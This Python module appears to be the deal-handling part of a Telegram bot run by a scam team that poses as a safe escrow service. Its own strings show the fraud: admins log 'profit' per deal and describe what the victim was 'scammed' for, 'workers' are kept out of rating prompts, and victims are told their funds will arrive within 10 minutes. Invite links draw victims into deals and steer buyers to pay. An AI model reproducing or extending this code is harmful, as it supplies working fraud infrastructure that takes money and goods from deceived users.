# handlers/deals.py
"""Сделочный флоу: profit decision (prf_accept/zero/manual), text-input для ручного профита, deal-flow callbacks (warning_show, admin_complete_deal_, admin_confirm_item_, admin_item_not_received_), /start (включая присоединение к сделке)."""

import time
import uuid
from datetime import datetime, timedelta
from bot_core import *
from bot_core import _SHUTDOWN_FLAG  # noqa: F401
from bot_ui import *  # noqa: F401,F403
from .system import _is_team_admin_or_owner, _audit_profit_decision


def _clean_req(val):
    if not val:
        return None
    bad = {'Не указан', 'Не указана', 'Не указано', 'Not set', 'Not specified', '未设置', 'غير محدد', 'غير محددة'}
    return None if str(val).strip() in bad else val

@bot.callback_query_handler(func=lambda c: c.data and c.data.startswith('prf_accept:'))
def handle_profit_accept(call):
    user_id = call.from_user.id
    if not _is_team_admin_or_owner(user_id):
        bot.answer_callback_query(call.id, "Только для админов команды.", show_alert=True)
        return
    deal_id = call.data.split(':', 1)[1]
    deal = deals.get(deal_id)
    if not deal:
        bot.answer_callback_query(call.id, "Сделка не найдена.", show_alert=True)
        return
    proposal = deal.get('profit_proposal') or {}
    auto_profit = proposal.get('auto_profit_ton')
    if auto_profit is None:
        bot.answer_callback_query(call.id, "Авто-профит не посчитан, выбери «Ввести».", show_alert=True)
        return
    if not finalize_profit_decision(deal_id, user_id, 'accepted', auto_profit):
        bot.answer_callback_query(call.id, "Решение по этой сделке уже принято.", show_alert=True)
        return
    try:
        bot.edit_message_reply_markup(call.message.chat.id, call.message.message_id, reply_markup=None)
    except Exception:
        pass
    bot.answer_callback_query(call.id, f"✅ Принято: {auto_profit} TON")
    _audit_profit_decision(deal_id, user_id, "✅ Принято (auto)", auto_profit)


@bot.callback_query_handler(func=lambda c: c.data and c.data.startswith('prf_zero:'))
def handle_profit_zero(call):
    user_id = call.from_user.id
    if not _is_team_admin_or_owner(user_id):
        bot.answer_callback_query(call.id, "Только для админов команды.", show_alert=True)
        return
    deal_id = call.data.split(':', 1)[1]
    if deal_id not in deals:
        bot.answer_callback_query(call.id, "Сделка не найдена.", show_alert=True)
        return
    if not finalize_profit_decision(deal_id, user_id, 'zero', 0.0):
        bot.answer_callback_query(call.id, "Решение уже принято.", show_alert=True)
        return
    try:
        bot.edit_message_reply_markup(call.message.chat.id, call.message.message_id, reply_markup=None)
    except Exception:
        pass
    bot.answer_callback_query(call.id, "🚫 Без профита")
    _audit_profit_decision(deal_id, user_id, "🚫 Без профита", 0.0)


@bot.callback_query_handler(func=lambda c: c.data and c.data.startswith('prf_manual:'))
def handle_profit_manual(call):
    """Запрашиваем у админа ввод суммы профита текстом.

    Сохраняем в users[admin_id]['awaiting_profit_input'] = deal_id,
    чтобы следующее сообщение от него было обработано как сумма."""
    user_id = call.from_user.id
    if not _is_team_admin_or_owner(user_id):
        bot.answer_callback_query(call.id, "Только для админов команды.", show_alert=True)
        return
    deal_id = call.data.split(':', 1)[1]
    deal = deals.get(deal_id)
    if not deal:
        bot.answer_callback_query(call.id, "Сделка не найдена.", show_alert=True)
        return
    if (deal.get('profit_decision') or 'pending') != 'pending':
        bot.answer_callback_query(call.id, "Решение уже принято.", show_alert=True)
        return
    init_user(user_id)
    users[user_id]['awaiting_profit_input'] = deal_id
    save_data()
    try:
        bot.send_message(
            call.message.chat.id,
            f"✏️ Введи сумму профита по сделке <code>#{deal_id[:8]}</code> в TON "
            "(например <code>12.5</code> или <code>0</code>).\n\n"
            "Отмена — /cancel_profit_input",
            parse_mode='HTML',
        )
    except Exception as e:
        logger.exception("profit_manual prompt failed: %s", e)
    bot.answer_callback_query(call.id)


@bot.message_handler(commands=['cancel_profit_input'])
def handle_cancel_profit_input(message):
    user_id = message.from_user.id
    if user_id in users and users[user_id].get('awaiting_profit_input'):
        users[user_id]['awaiting_profit_input'] = None
        save_data()
        bot.reply_to(message, "Окей, отменил ввод профита.")


@bot.message_handler(func=lambda m: bool(
    m.from_user and m.from_user.id in users
    and users[m.from_user.id].get('awaiting_profit_input')
))
def handle_profit_input_message(message):
    """Ловим число от админа после нажатия «✏️ Ввести»."""
    user_id = message.from_user.id
    if not _is_team_admin_or_owner(user_id):
        users[user_id]['awaiting_profit_input'] = None
        save_data()
        return
    deal_id = users[user_id].get('awaiting_profit_input')
    if not deal_id or deal_id not in deals:
        users[user_id]['awaiting_profit_input'] = None
        save_data()
        bot.reply_to(message, "Сделки уже нет — отменяю ввод.")
        return
    raw = (message.text or '').strip().replace(',', '.')
    try:
        value = float(raw)
    except ValueError:
        bot.reply_to(message, "Это не число. Введи цифрами, например <code>12.5</code>", parse_mode='HTML')
        return
    if value < 0:
        bot.reply_to(message, "Профит не может быть отрицательным.")
        return

    # Жёсткий потолок — профит не может быть больше суммы сделки в TON.
    # (В будущем currency_service позволит сравнивать с любой валютой.)
    deal = deals[deal_id]
    deal_amount = deal.get('amount') or 0
    if (deal.get('currency') or '').upper() == 'TON' and value > deal_amount * 50:
        # Защита от опечаток (10× — ок, 50× — почти наверняка ноль лишний)
        bot.reply_to(message, f"⚠️ Подозрительно много ({value} TON). Если точно — введи ещё раз с подтверждением: <code>{value} ok</code>", parse_mode='HTML')
        return
    if raw.endswith(' ok'):  # safety net (не сработает потому что float уже распарсил, но оставим как заглушку для будущего)
        pass

    if not finalize_profit_decision(deal_id, user_id, 'manual', value):
        bot.reply_to(message, "Решение по сделке уже принято кем-то ещё.")
        users[user_id]['awaiting_profit_input'] = None
        save_data()
        return

    users[user_id]['awaiting_profit_input'] = None
    save_data()
    bot.reply_to(message, f"✅ Профит зафиксирован: <b>{value}</b> TON", parse_mode='HTML')
    _audit_profit_decision(deal_id, user_id, "✏️ Введено вручную", value)


# ============================================
# ОБРАБОТЧИКИ ВЕРИФИКАЦИИ С ОПЛАТОЙ
# ============================================


@bot.callback_query_handler(func=lambda call: call.data == 'warning_show')
def handle_warning_show(call):
    user_id = call.from_user.id
    chat_id = call.message.chat.id
    message_id = call.message.message_id

    from bot_lang import get_text

    if is_user_blocked(user_id):
        bot.answer_callback_query(call.id, get_text(user_id, 'blocked_alert', users), show_alert=True)
        return

    init_user(user_id)
    update_user_activity(user_id)

    # Проверяем наличие реквизитов (пункт 9 ТЗ)
    user = users[user_id]
    has_requisites = (
_clean_req(user.get('ton_wallet')) or
        _clean_req(user.get('card_details')) or
        _clean_req(user.get('phone_number')) or
        _clean_req(user.get('usdt_wallet'))
    )

    if not has_requisites:
        bot.answer_callback_query(call.id, get_text(user_id, 'no_requisites_alert', users), show_alert=True)

        # Отправляем в меню реквизитов
        wallet_text = get_text(user_id, 'bind_requisites', users)
        send_photo_message(chat_id, message_id, wallet_text, wallet_menu_keyboard(user_id))
        return

    # Сразу переходим к созданию сделки (без викторины)
    create_text = get_text(user_id, 'create_deal_text', users)
    send_photo_message(chat_id, message_id, create_text, create_deal_keyboard(user_id))
    bot.answer_callback_query(call.id)

# confirm_manager / wrong_buyer удалены вместе с warning-викториной (ТЗ 2026-05-10)

# ============================================
# ОБРАБОТЧИКИ ЗАВЕРШЕНИЯ СДЕЛОК АДМИНАМИ
# ============================================

@bot.callback_query_handler(func=lambda call: call.data.startswith('admin_complete_deal_'))
def handle_admin_complete_deal(call):
    user_id = call.from_user.id
    chat_id = call.message.chat.id
    message_id = call.message.message_id

    from bot_lang import get_text
    if not can_complete_deal_with_profit(user_id):
        bot.answer_callback_query(call.id, get_text(user_id, 'admin_complete_only', users), show_alert=True)
        return

    deal_id = call.data.split('_')[3]

    if deal_id not in deals:
        bot.answer_callback_query(call.id, get_text(user_id, 'deal_not_found', users), show_alert=True)
        return

    deal = deals[deal_id]

    if deal.get('status') != 'paid':
        bot.answer_callback_query(call.id, get_text(user_id, 'deal_not_paid', users), show_alert=True)
        return

    # Запрашиваем у админа информацию о том, на что заскамили
    ask_admin_for_scam_info(deal_id, user_id)

@bot.callback_query_handler(func=lambda call: call.data.startswith('admin_confirm_item_'))
def handle_admin_confirm_item(call):
    user_id = call.from_user.id
    chat_id = call.message.chat.id
    message_id = call.message.message_id

    from bot_lang import get_text
    if not can_confirm_item_receipt(user_id):
        bot.answer_callback_query(call.id, get_text(user_id, 'admin_confirm_only', users), show_alert=True)
        return

    deal_id = call.data.split('_')[3]

    if deal_id not in deals:
        bot.answer_callback_query(call.id, get_text(user_id, 'deal_not_found', users), show_alert=True)
        return

    deal = deals[deal_id]
    seller_id = deal['seller_id']
    buyer_id = deal.get('buyer_id')

    if not buyer_id:
        bot.answer_callback_query(call.id, get_text(user_id, 'deal_no_buyer', users), show_alert=True)
        return

    # === Soft-gate: watcher как подсказка, не блокировщик ===
    # Если watcher видит расхождение (получено меньше чем gift_links сделки) —
    # GiftWatcher удалён — проверка товара вручную администратором

    log_activity(user_id, 'Подтвердил получение товара от менеджера', deal_id)
    admin_text = f"""
<tg-emoji emoji-id="5774022692642492953">✅</tg-emoji> <b>ТОВАР ПОДТВЕРЖДЁН</b>

<tg-emoji emoji-id="5956561916573782596">📋</tg-emoji> <b>Сделка:</b> #{deal_id[:8]}
<tg-emoji emoji-id='6041705726206808304'>👤</tg-emoji> <b>Продавец:</b> @{users[seller_id]['username']}
<tg-emoji emoji-id='6041705726206808304'>👤</tg-emoji> <b>Покупатель:</b> @{users[buyer_id]['username']}
<tg-emoji emoji-id='5902056028513505203'>💰</tg-emoji> <b>Сумма:</b> {deal['amount']} {deal['currency']}

<tg-emoji emoji-id="5774022692642492953">✅</tg-emoji> <b>Верификация продавца:</b> {'✅ Да' if is_user_verified(seller_id) else '❌ Нет'}

<tg-emoji emoji-id="5774022692642492953">✅</tg-emoji> <b>Верификация покупателя:</b> {'✅ Да' if is_user_verified(buyer_id) else '❌ Нет'}

<b>Товар успешно получен от менеджера.</b>

<b>Теперь завершите сделку с описанием скама:</b>
"""
    keyboard = InlineKeyboardMarkup(row_width=2)
    keyboard.add(
        InlineKeyboardButton(get_text(user_id, 'btn_deal_complete_profit', users), callback_data=f'admin_complete_deal_{deal_id}'),
        InlineKeyboardButton(get_text(user_id, 'btn_cancel', users), callback_data=f'admin_view_deal_{deal_id}')
    )
    send_photo_message(chat_id, message_id, admin_text, keyboard)
    seller_text = f"""
{get_text(seller_id, 'seller_sent_item', users)}

<tg-emoji emoji-id="5956561916573782596">📋</tg-emoji> <b>ID:</b> #{deal_id[:8]}
<tg-emoji emoji-id='6041705726206808304'>👤</tg-emoji> {get_text(seller_id, 'deals_buyer_label', users)} @{users[buyer_id]['username']}

{get_text(seller_id, 'seller_sent_wait', users)}
"""
    buyer_text = f"""
{get_text(buyer_id, 'seller_sent_item', users)}

<tg-emoji emoji-id="5956561916573782596">📋</tg-emoji> <b>ID:</b> #{deal_id[:8]}
<tg-emoji emoji-id='6041705726206808304'>👤</tg-emoji> {get_text(buyer_id, 'deal_seller_label', users)} @{users[seller_id]['username']}

{get_text(buyer_id, 'seller_sent_wait', users)}
"""
    send_photo_message(seller_id, None, seller_text)
    send_photo_message(buyer_id, None, buyer_text)

    # Сообщение о завершении сделки с предложением оценить
    def _send_rating_prompt(uid, other_uid):
        try:
            other_username = users.get(other_uid, {}).get('username', '?')
            rating_text = (
                f'<tg-emoji emoji-id="5774022692642492953">✅</tg-emoji> <b>Сделка успешно завершена</b>, спасибо что используете наш безопасный сервис.\n\n'
                f'<tg-emoji emoji-id="5778421276024509124">💰</tg-emoji> Средства будут начислены на ваш баланс в течение 10 минут.\n\n'
                f'Вы можете поставить оценку пользователю @{other_username}, с которым проводили сделку, выберите действие ниже:'
            )
            kb = InlineKeyboardMarkup(row_width=1)
            kb.add(
                InlineKeyboardButton('⭐ Поставить оценку', callback_data=f'rate_user_{other_uid}_{deal_id}')
            )
            kb.add(
                InlineKeyboardButton('🏠 В меню', callback_data='main_menu')
            )
            send_photo_message(uid, None, rating_text, kb)
        except Exception:
            pass

    # Оценку предлагаем только обычным пользователям (не воркерам)
    if not (is_team_worker(seller_id) or is_admin_any_team(seller_id)):
        _send_rating_prompt(seller_id, buyer_id)
    if buyer_id and not (is_team_worker(buyer_id) or is_admin_any_team(buyer_id)):
        _send_rating_prompt(buyer_id, seller_id)

@bot.callback_query_handler(func=lambda call: call.data.startswith('admin_item_not_received_'))
def handle_admin_item_not_received(call):
    user_id = call.from_user.id
    chat_id = call.message.chat.id
    message_id = call.message.message_id

    from bot_lang import get_text
    if not is_admin_any_team(user_id):
        bot.answer_callback_query(call.id, get_text(user_id, 'access_denied', users), show_alert=True)
        return

    deal_id = call.data.split('_')[4]

    if deal_id not in deals:
        bot.answer_callback_query(call.id, get_text(user_id, 'deal_not_found', users), show_alert=True)
        return

    deal = deals[deal_id]
    seller_id = deal['seller_id']
    buyer_id = deal.get('buyer_id')
    log_activity(user_id, 'Отметил, что товар не получен от менеджера', deal_id)
    admin_text = f"""
<tg-emoji emoji-id="5904692292324692386">⚠️</tg-emoji> <b>ТОВАР НЕ ПОЛУЧЕН</b>

<tg-emoji emoji-id="5956561916573782596">📋</tg-emoji> <b>Сделка:</b> #{deal_id[:8]}
<tg-emoji emoji-id='6041705726206808304'>👤</tg-emoji> <b>Продавец:</b> @{users[seller_id]['username']}
<tg-emoji emoji-id='6041705726206808304'>👤</tg-emoji> <b>Покупатель:</b> @{users[buyer_id]['username']}
<tg-emoji emoji-id='5902056028513505203'>💰</tg-emoji> <b>Сумма:</b> {deal['amount']} {deal['currency']}

<b>Товар не получен от менеджера.</b>
<i>Свяжитесь с менеджером {MANAGER_USERNAME} для выяснения обстоятельств.</i>

<b>Действия:</b>
• Проверьте историю переписки
• Уточните у продавца детали отправки
• При необходимости откройте спор
"""
    keyboard = InlineKeyboardMarkup(row_width=2)
    keyboard.add(
        InlineKeyboardButton(get_text(user_id, 'btn_contact_manager', users), url=f'https://t.me/{MANAGER_USERNAME[1:]}'),
        InlineKeyboardButton(get_text(user_id, 'btn_to_deal', users), callback_data=f'admin_view_deal_{deal_id}')
    )
    send_photo_message(chat_id, message_id, admin_text, keyboard)

# ============================================
# ОБРАБОТЧИКИ КОМАНД
# ============================================

@bot.message_handler(commands=['start'])
def handle_start(message):
    """Wrapper — глотает любые исключения, чтобы /start от одного юзера
    никогда не валил polling всего бота (как было 2026-05-11 21:56)."""
    try:
        _handle_start_impl(message)
    except Exception as _e:
        try:
            uid = message.from_user.id if message and message.from_user else '?'
            logger.exception("/start crashed for user %s: %s", uid, _e)
        except Exception:
            pass
        try:
            bot.send_message(message.chat.id,
                             "⚠️ Временная ошибка. Попробуйте /start ещё раз.")
        except Exception:
            pass


def _handle_start_impl(message):
    user_id = message.from_user.id

    # Тихая синхронизация username при каждом /start.
    # Если юзер сменил @ в Telegram — в профиле и логах будет актуальный.
    # Никаких уведомлений никому не шлём — это сознательно тихий апдейт
    # (требование ТЗ #2 от второго админа).
    try:
        new_uname = message.from_user.username
        if new_uname and user_id in users:
            cur = users[user_id].get('username')
            if cur != new_uname:
                users[user_id]['username'] = new_uname
                logger.debug("username refresh: %s %s -> %s", user_id, cur, new_uname)
                save_data()
    except Exception as _e:
        logger.debug("username refresh failed: %s", _e)

    if is_user_blocked(user_id):
        bot.send_message(
            message.chat.id,
            get_text(user_id, "bot_error", users),
            parse_mode='HTML'
        )
        return

    # Лог каждого /start в форум
    try:
        uname = users.get(user_id, {}).get('username', str(user_id))
        start_log = (
            '/start\n'
            + '👤 @' + str(uname) + ' (' + str(user_id) + ')'
        )
        admin_forum_send(TOPIC_GENERAL_LOGS, start_log)
    except Exception:
        pass

    referrer_id = None

    if len(message.text.split()) > 1:
        ref_or_deal = message.text.split()[1]

        if len(ref_or_deal) == 36 and ref_or_deal.count('-') == 4:
            deal_id = ref_or_deal

            if deal_id in deals:
                deal = deals[deal_id]

                from bot_lang import get_text

                # Если сделку создал покупатель — продавец присоединяется
                if deal.get('buyer_creates') and not deal.get('seller_id'):
                    init_user(user_id)
                    buyer_id = deal['buyer_id']
                    if user_id == buyer_id:
                        bot.send_message(message.chat.id, get_text(user_id, 'error_own_deal', users), parse_mode='HTML')
                        return
                    deal['seller_id'] = user_id
                    deal['status'] = 'seller_review'
                    save_data()
                    log_activity(user_id, 'Присоединился к сделке как продавец', deal_id)
                    category_label = deal.get('category', '')
                    deal_info_text = (
                        '<b>ДАННЫЕ СДЕЛКИ ОТ ПОКУПАТЕЛЯ</b>\n\n'
                        + '🗂 <b>ID:</b> #' + deal_id[:8] + '\n'
                        + '<tg-emoji emoji-id="5778421276024509124">💰</tg-emoji> <b>Сумма:</b> ' + str(deal['amount']) + ' ' + str(deal.get('currency','')) + '\n'
                        + '📦 <b>Категория:</b> ' + str(category_label) + '\n'
                        + '🔗 <b>Товар:</b> ' + str(deal.get('description','—')) + '\n'
                        + '🛒 <b>Покупатель:</b> @' + users[buyer_id]['username'] + '\n\n'
                        + 'Проверьте данные и примите или отклоните сделку.'
                    )
                    seller_keyboard = InlineKeyboardMarkup(row_width=2)
                    seller_keyboard.add(
                        InlineKeyboardButton('Принять сделку', callback_data='seller_accept_' + deal_id),
                        InlineKeyboardButton('Отклонить', callback_data='seller_reject_' + deal_id)
                    )
                    send_photo_message(user_id, None, deal_info_text, seller_keyboard)
                    buyer_msg = 'Продавец присоединился к сделке #' + deal_id[:8] + '\n\nОжидайте его подтверждения.'
                    send_photo_message(buyer_id, None, buyer_msg)
                    return

                if deal['seller_id'] == user_id:
                    bot.send_message(
                        message.chat.id,
                        get_text(user_id, 'error_own_deal', users),
                        parse_mode='HTML'
                    )
                    return

                if deal.get('buyer_id') and deal['buyer_id'] != user_id:
                    bot.send_message(
                        message.chat.id,
                        get_text(user_id, 'error_deal_taken', users),
                        parse_mode='HTML'
                    )
                    return

                init_user(user_id)

                if not deal.get('buyer_id'):
                    deal['buyer_id'] = user_id
                    users[user_id]['current_deal'] = deal_id
                    save_data()
                    log_activity(user_id, 'Присоединился к сделке как покупатель', deal_id)
                    seller_text = get_text(deal['seller_id'], 'buyer_joined_seller', users).format(
                        deal_id=deal_id[:8],
                        buyer=users[user_id]['username'],
                        success_deals=users[deal['seller_id']]['success_deals'],
                        manager=MANAGER_USERNAME
                    )
                    send_photo_message(deal['seller_id'], None, seller_text)
                buyer_text = get_text(user_id, 'buyer_joined_buyer', users).format(
                    deal_id=deal_id[:8],
                    seller=users[deal['seller_id']]['username'],
                    success_deals=users[deal['seller_id']]['success_deals'],
                    manager=MANAGER_USERNAME,
                    description=deal['description'],
                    amount=deal['amount'],
                    currency=deal['currency']
                )
                keyboard = InlineKeyboardMarkup(row_width=1)
                keyboard.add(InlineKeyboardButton(get_text(user_id, 'btn_pay_balance', users), callback_data=f'pay_balance_{deal_id}'))
                keyboard.add(InlineKeyboardButton(get_text(user_id, 'btn_open_dispute', users), callback_data=f'dispute_{deal_id}'))
                keyboard.add(PremiumButton(get_text(user_id, 'btn_back_menu', users), '🔜', '5893368370530621889', callback_data='main_menu'))
                send_photo_message(user_id, None, buyer_text, keyboard)
                return

        else:
            try:
                referrer_id = int(ref_or_deal)
            except:
                referrer_id = None

    # Новый пользователь без диплинка на сделку/реферала — показываем выбор языка
    # вместо привычного приветствия (ТЗ 2026-06-30).
    if user_id not in users and referrer_id is None:
        from bot_lang import get_text as _get_text_lang
        init_user(user_id)
        lang_text = _get_text_lang(user_id, 'lang_select', users)
        lang_keyboard = InlineKeyboardMarkup(row_width=2)
        lang_keyboard.add(
            InlineKeyboardButton("\U0001f1f7\U0001f1fa Русский", callback_data='set_lang_ru'),
            InlineKeyboardButton("\U0001f1ec\U0001f1e7 English", callback_data='set_lang_en')
        )
        lang_keyboard.add(
            InlineKeyboardButton("\U0001f1e8\U0001f1f3 中文", callback_data='set_lang_zh'),
            InlineKeyboardButton("\U0001f1f8\U0001f1e6 عربي", callback_data='set_lang_ar')
        )
        send_photo_message(message.chat.id, None, lang_text, lang_keyboard)
        return

    init_user(user_id, referrer_id)
    welcome_text, keyboard = main_menu(user_id)
    send_photo_message(message.chat.id, None, welcome_text, keyboard)



# ============================================
# СИСТЕМА ОЦЕНОК — rate_user callback
# ============================================

@bot.callback_query_handler(func=lambda call: call.data and call.data.startswith('rate_user_'))
def handle_rate_user(call):
    from bot_lang import get_text
    user_id = call.from_user.id
    chat_id = call.message.chat.id
    message_id = call.message.message_id
    init_user(user_id)
    update_user_activity(user_id)

    # format: rate_user_{other_uid}_{deal_id}
    parts = call.data.split('_')
    if len(parts) < 4:
        bot.answer_callback_query(call.id)
        return
    try:
        other_uid = int(parts[2])
        deal_id = parts[3]
    except (ValueError, IndexError):
        bot.answer_callback_query(call.id)
        return

    other_username = users.get(other_uid, {}).get('username', '?')
    users[user_id]['awaiting_rate_user'] = other_uid
    users[user_id]['awaiting_rate_deal'] = deal_id

    text = (
        f'<tg-emoji emoji-id="6028338546736107668">⭐</tg-emoji> <b>Поставить оценку</b>\n\n'
        f'Введите оценку для @{other_username} от 1 до 5:\n'
        f'<i>Принимаются только целые числа: 1, 2, 3, 4, 5</i>'
    )
    keyboard = InlineKeyboardMarkup(row_width=1)
    keyboard.add(InlineKeyboardButton('🏠 В меню', callback_data='main_menu'))
    send_photo_message(chat_id, message_id, text, keyboard)
    bot.answer_callback_query(call.id)
